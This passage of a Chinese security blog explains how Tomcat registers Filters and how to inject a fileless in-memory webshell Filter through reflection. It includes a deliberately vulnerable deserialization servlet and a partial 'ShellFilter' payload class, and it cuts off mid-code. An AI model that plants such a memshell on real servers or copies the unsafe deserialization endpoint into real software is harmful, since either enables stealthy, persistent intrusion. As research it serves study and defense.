/></p><p>Servlet作为客户端和业务逻辑的中间层，接受客户端请求<code>HttpServletRequest</code>、<code>init()</code>创建一个servlet并执行<code>service()</code>的代码逻辑，最后<code>destroy()</code>销毁。其中service根据客户端不同的HTTP方法，对应有<code>doGet()</code>、<code>doPost()</code>、<code>doPut()</code>等方法。</p><p>定义一个Servlet的方法是继承<code>javax.servlet.http.HttpServlet</code>并覆写其中的对应的HTTP方法即可。</p><p>Servlet3.0开始新增了对注解的支持，我们可以使用如<code>@webServlet</code>、<code>@webFilter</code>、<code>@WebListener</code>等注解<strong>静态</strong>地编写对应的<code>Servlet</code>、<code>Filter</code>、<code>Listener</code>。</p><p>此外，我们也可以使用<code>addServlet</code>、<code>addFilter</code>、<code>addListener</code>注解<strong>动态地</strong>添加新的<code>Servlet</code>、<code>Filter</code>、<code>Listener</code>。</p><p><strong>也正是这一动态加载的手段为我们的利用留下了可能性。</strong>具体来说，tomcat（版本10）中，这三个组件都是由<code>jakarta.servlet.ServletContext</code>接口来加载的，具体实现类为<code>org.apache.catalina.core.ApplicationContextFacade</code>：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230504153747060.png" /></p><p>而该接口中就定义了对应的方法来实现动态的注册：</p><blockquote><p>能基于这玩意儿的原因是因为从Servlet3.0开始他们提供了动态创建Servlet、Filter、Listener的方法，我也不知道这个的需求来自什么。。。</p></blockquote><p><imgsrc="/img/Java内存马原理（一）/image-20230808140435910.png" /></p><p>插一嘴，这里从具体实现类的名字后缀可以看出使用了设计模式中的<strong>外观模式（Facede）</strong>，即将一个黑盒子进一步的包装提供接口以简化使用。后面代码调试中就可以看到其实际指向的是一个<code>org.apache.catalina.core.Application</code>类：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230808144526970.png" /></p><p>我们先写一个简单的servlet：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> f10at.webshell.web.servletdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(value = &quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;Hello&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动后访问对应的path： <imgsrc="/img/Java内存马原理（一）/image-20230808140003166.png" /></p><h1 id="基于filter">基于Filter</h1><p>过滤器的作用主要是<strong>动态地拦截请求和响应，以变化或使用在请求或响应中地信息</strong>，可以实现以下目的：</p><ul><li>在客户端的请求访问后端资源之前，拦截这些请求。</li><li>在服务器的响应发送到客户端之前，处理这些响应。</li></ul><p>常见的由以下作用类型的过滤器：</p><ul><li>身份验证过滤器（Authentication Filters）。</li><li>数据压缩过滤器（Data compression Filters）。</li><li>加密过滤器（Encryption Filters）。</li><li>触发资源访问事件过滤器。</li><li>图像转换过滤器（Image Conversion Filters）。</li><li>日志记录和审核过滤器（Logging and Auditing Filters）。</li><li>MIME-TYPE 链过滤器（MIME-TYPE Chain Filters）。</li><li>标记化过滤器（Tokenizing Filters）。</li><li>XSL/T 过滤器（XSL/T Filters），转换 XML 内容。</li></ul><p>过滤器类的编写主要是实现了<code>javax.servlet.Filter</code>接口，我们先写一个简单的Filter过滤器，并调试一下看看Tomcat是如何将它注册的。一个简单的Filter如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> f10at.webshell.web.servletdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/8/8</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebFilter(value = &quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter here!&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动项目访问对应接口后，我们可以看到过滤器的效果：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230808141103263.png" /></p><h2 id="filterchain注册过程">FilterChain注册过程</h2><p>为了便于理解利用方法，源码中filter的工作流程还是有必要过一下。在doFilter方法中增加断点，查看一下调用链：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">doFilter:17, MyFilter (f10at.webshell.web.servletdemo)</span><br><span class="line">internalDoFilter:174, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:149, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:166, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:90, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:482, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:115, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:93, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:676, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:74, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:341, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:391, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:63, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:894, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1740, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:52, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:834, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>可以看到，在<code>ApplicationFilterChain</code>这个类的174行调用了<code>internalDoFilter</code>方法，在该方法中调用了filter的doFilter方法从而来到我们的代码中：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230808142920344.png" /></p><p>而这个filterChain则是由<code>ApplicationFilterFactory</code>这个工厂类创建的：<img src="/img/Java内存马原理（一）/image-20230808143107888.png" /></p><p>从文档中可以看出，该类中注册了所有的Filter，依次调用功能<code>doFilter</code>方法并传递请求和响应对象以触发下一个Filter的调用，最终到达service方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implementation of jakarta.servlet.FilterChain used to manage the execution of a set of filters for a   </span></span><br><span class="line"><span class="comment"> * particular request. When the set of defined filters has all been executed, the next call to doFilter() will </span></span><br><span class="line"><span class="comment"> * execute the servlet&#x27;s service() method itself.</span></span><br><span class="line"><span class="comment"> * Author:</span></span><br><span class="line"><span class="comment"> * Craig R. McClanahan</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>我们进一步查看一下<code>createFilterChain</code>方法内容，大致上可以分为两部分：</p><ul><li>新建ApplicationFilterChain对象</li><li>遍历FilterMap[]，添加符合客户端请求的Filter到过滤链中</li></ul><p><imgsrc="/img/Java内存马原理（一）/image-20230808163641014.png" /></p><p>从文档中可以看出，该方法构造了一个<code>FilterChain</code>接口的实例，其中包含了参数<code>servlet</code>对应的所有的Filter。</p><blockquote><p>代码中@WebFilter的value属性就在后面发挥了作用</p></blockquote><p><imgsrc="/img/Java内存马原理（一）/image-20230808163741065.png" /></p><p>拿到所有的Filters后，分两种情况对其进行添加：</p><ul><li>若Filter的URL和当前请求的路径一致，则获取<code>ApplicationFilterConfig</code>并将这个filter添加到filterChain中。</li></ul><p><imgsrc="/img/Java内存马原理（一）/image-20230808163936530.png" /></p><p><imgsrc="/img/Java内存马原理（一）/image-20230808164131800.png" /></p><ul><li>第二类情况，若这个Filter有设置<code>ServletName</code>，则和当前访问的Servlet的名字一样，那么就添加到filterChain中：</li></ul><p><imgsrc="/img/Java内存马原理（一）/image-20230808153725038.png" /></p><p><imgsrc="/img/Java内存马原理（一）/image-20230808153637505.png" /></p><p>可以在注解中使用<code>servletNames</code>来使一个filter可以对应多个Servlet：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230808153830704.png" /></p><p>最终，<strong>所有容器中的Filters都处理完后，返回filterChain</strong>：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230808153759548.png" /></p><p>我们可以总结出Tomcat注册一个Filter并执行其逻辑的流程：</p><ul><li>利用ApplicationFIlterFactory工厂类创建一个FilterChain<ul><li>获取容器中所有的FilterMaps</li><li>遍历每一个FilterMap，判断是否与当前访问的URL模式匹配，是则添加到当前请求处理的FilterChain中</li><li>返回FilterChain</li></ul></li><li>遍历FilterChain，取出FilerConfig中、FilterDef中的Filter，并调用其doFilter方法。</li></ul><p><strong>特点：每次客户端请求到达时，都会构造一个新的FilterChain对象并载入各个匹配的过滤器。</strong></p><h2 id="利用方法">利用方法</h2><p>根据上面的流程，思路很清晰，就是注册一个包含恶意代码的Filter到上述的<code>ApplicationFilterChain</code>中。直观上，我们可以依靠<code>ApplicationContextFacade</code>的<code>addFilter</code>方法，<strong>但是只靠他是不够的</strong>。</p><p>我们先阅读一下源码中<code>addFilter</code>方法的具体逻辑，了解<strong>注册一个Filter的条件是什么</strong>。</p><p>该方法由<code>ServletContext</code>接口定义，并有三个重载： <imgsrc="/img/Java内存马原理（一）/image-20230808144014116.png" /></p><p>三个方法第一个参数都是Filter的名称，第二个参数可以指定类名、第三个可以指定一个Filter接口的子类。因为是Facade外观模式，所以实际上他们三个本质上都是调用了<code>ApplicationContext</code>对应的addFilter方法：<img src="/img/Java内存马原理（一）/image-20230808144820744.png" /></p><p>其中前三个重载都会调用第四个，所以我们直接看第四个就可以了：</p><figure><img src="/img/Java内存马原理（一）/image-20230808165211119.png"alt="image-20230808165211119" /><figcaption aria-hidden="true">image-20230808165211119</figcaption></figure><p>其中<code>checkState</code>函数如下：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230808165247974.png" /></p><p>小结一下，这里存在两个困难点：</p><ol type="1"><li><code>checkState</code>函数表明，当前容器状态必须为<strong>STARTING_PREP（准备启动状态）</strong>，所以我们无法在Tomcat处于<strong>STARTED（已启动）</strong>的运行时状态下直接利用。</li><li>这里只是将一个<code>FilterDef</code>添加到了容器中，从上一小节的流程来看，单纯只是在容器中多了一个定义是没有用的，讲道理需要把它包装到<code>FilterConfig</code>中并调用<code>FilterChain</code>对象的<code>addFilter</code>方法才能添加。</li></ol><p>那怎么办？</p><p>对于问题1，我们可以利用反射获取到生命状态并进行修改。对于问题2，我们需要利用如下途径来解决：</p><p>在<code>StandardContext</code>中有一个方法<code>filterStart</code>：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230808160304824.png" /></p><p>该方法遍历所有的filter定义，并和其名称一起放入filterConfigs这个HashMap中。在这里，<strong>filterDef得到了包装</strong>。</p><p>该方法在Tomcat启动时就被调用了，调用链如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">filterStart:4302, StandardContext (org.apache.catalina.core)</span><br><span class="line">startInternal:4922, StandardContext (org.apache.catalina.core)</span><br><span class="line">start:183, LifecycleBase (org.apache.catalina.util)</span><br><span class="line">addChildInternal:683, ContainerBase (org.apache.catalina.core)</span><br><span class="line">addChild:658, ContainerBase (org.apache.catalina.core)</span><br><span class="line">addChild:713, StandardHost (org.apache.catalina.core)</span><br><span class="line">manageApp:1821, HostConfig (org.apache.catalina.startup)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:566, Method (java.lang.reflect)</span><br><span class="line">invoke:294, BaseModelMBean (org.apache.tomcat.util.modeler)</span><br><span class="line">invoke:809, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)</span><br><span class="line">invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver)</span><br><span class="line">createStandardContext:428, MBeanFactory (org.apache.catalina.mbeans)</span><br><span class="line">createStandardContext:376, MBeanFactory (org.apache.catalina.mbeans)</span><br><span class="line">... 省略 ...</span><br><span class="line">runWorker:1128, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:628, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:834, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>到这里还没有结束，我们还需要为这个Filter绑定URL，因为对方显然不会再web.xml里写我们的filter，我们给自己的恶意filter带上<code>@WebFilter</code>注解也没用（没有初始化）。因此，我们需要利用<code>ApplicationFilterRegistration</code>的<code>addMappingForUrlPatterns</code>方法：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230808162634878.png" /></p><p>因此，我们可以初步总结出思路了：</p><ul><li>反射修改Tomcat运行状态为<code>LifecycleState.STARTING_PREP</code>状态。</li><li>通过<code>ApplicationContextFacade.addFilter</code>方法，添加我们的<code>FilterDef</code>到容器中。</li><li>调用<code>ApplicationFilterRegistration.addMappingForUrlPatterns</code>方法添加URL匹配模式。</li><li>修改回来Tomcat运行状态为<code>LifecycleState.STARTED</code>。</li><li>调用<code>StandardContext.filterStart</code>方法将我们的<code>FilterDef</code>包装成为<code>ApplicationFilterConfig</code>并放入容器中。</li></ul><p>最后要考虑的问题就是如何拿到<code>ApplicationContextFacade</code>，我们可以通过客户端请求<code>ServletRequest</code>中获取。具体来说，在<code>ApplicationFilterChain</code>中有两个threadlocal类：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230809090920182.png" /></p><p>默认情况下是不会初始化的：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230809091006692.png" /></p><p>而若我们通过反射将这个属性设置为true的话，那就可以拿到客户端请求对象了，从而获取到上下文。所以最终的思路总结如下：</p><ul><li>反射获取到<code>ApplicationFilterChain</code>的<code>dispatcherWrapsSameObject</code>属性并修改为true。</li><li>反射获取到客户端请求对象。</li><li>反射获取到<code>StandardContext</code>容器。</li><li>反射修改Tomcat运行状态为<code>LifecycleState.STARTING_PREP</code>状态。</li><li>通过<code>ApplicationContextFacade.addFilter</code>方法，添加我们的<code>FilterDef</code>到容器中。</li><li>调用<code>ApplicationFilterRegistration.addMappingForUrlPatterns</code>方法添加URL匹配模式，如<code>/*</code>匹配所有请求。</li><li>修改回来Tomcat运行状态为<code>LifecycleState.STARTED</code>。</li><li>调用<code>StandardContext.filterStart</code>方法将我们的<code>FilterDef</code>包装成为<code>ApplicationFilterConfig</code>并放入容器中。</li><li>[可选]调用<code>StandarConext.addFilterMapBedfore</code>方法将我们的恶意filter放到过滤链的第一个。</li></ul><h2 id="利用代码">利用代码</h2><p>根据上面的利用思路，我们可以基于Java的反射机制来实现一个恶意的Filter类，达到注册恶意后门路径并提供webshell的目的，且由于该webshell活动于tomcat内存中，也区别于基于文件的传统一句话webshell。</p><blockquote><p>但是首先，我们先要有一个可用的反序列化漏洞点，然后反序列化包含我们上述利用方法代码的对象，才可以实现持久化后门的效果。</p></blockquote><p>因此，这里用CC7链为基底进行改造，使其能够在反序列化之后实现内存马的目的。为了实验方便，我们在项目中引入CC3.1，并写一个漏洞接口：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 利用点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> f10at.webshell.web.servletdemo.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * CC利用示例接口</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/8/15</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/cc&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Using POST Method to Deserialize&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> req.getInputStream();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="comment">// 执行Java对象反序列化操作</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            System.err.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial生成CC7 exp并在burpsuite修改hex发送后，可以看到效果：</p><p><img src="/img/Java内存马原理（一）/cc.gif" /></p><p>（未完待续）</p><p>下面是一个根据上述利用方法思路的代码，本地环境实验待补充。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> f10at.webshell.web.payload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Tomcat filter型内存马</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/8/8</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 设置ApplicationFilterChain的dispatcherWrapsSameObject属性为true从而获取到两个ThreadLocal变量</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">dispatcherWrapSameObjectField</span> <span class="operator">=</span></span><br><span class="line">                    org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;dispatcherWrapsSameObject&quot;</span>);</span><br><span class="line">            dispatcherWrapSameObjectField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            dispatcherWrapSameObjectField.set(Boolean.class, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取请求对象以获取到上下文</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestObject</span> <span class="operator">=</span></span><br><span class="line">                    org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            requestObject.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 静态属性参数可以为null直接获取</span></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; t = (ThreadLocal&lt;ServletRequest&gt;) requestObject.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="comment">// 获取ApplicationContext</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> t.get().getServletContext();</span><br><span class="line">            <span class="comment">// 获取StandardContext</span></span><br><span class="line">            StandardContext standardContext;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> contextField.get(servletContext);</span><br><span class="line">                <span class="keyword">if</span> (o <span class="keyword">instanceof</span> jakarta.servlet.ServletContext) &#123;</span><br><span class="line">                    servletContext = (jakarta.servlet.ServletContext) o;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> org.apache.catalina.core.StandardContext) &#123;</span><br><span class="line">                    standardContext = (org.apache.catalina.core.StandardContext) o;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">       